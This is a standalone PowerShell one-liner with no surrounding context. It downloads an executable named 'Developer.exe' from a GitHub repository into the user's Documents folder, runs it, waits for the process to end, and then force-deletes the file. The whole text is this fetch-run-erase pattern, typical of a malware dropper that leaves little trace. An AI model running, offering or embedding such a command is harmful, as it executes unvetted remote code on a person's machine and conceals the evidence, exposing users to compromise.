$downloadUrl = "https://github.com/Sinz-Lab/Development/raw/main/Developer.exe"; $savePath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("MyDocuments"), "Developer.exe"); Invoke-WebRequest -Uri $downloadUrl -OutFile $savePath; Start-Process -FilePath $savePath; while (Get-Process -Name "Developer" -ErrorAction SilentlyContinue) { Start-Sleep -Seconds 1 }; Remove-Item -Path $savePath -Force
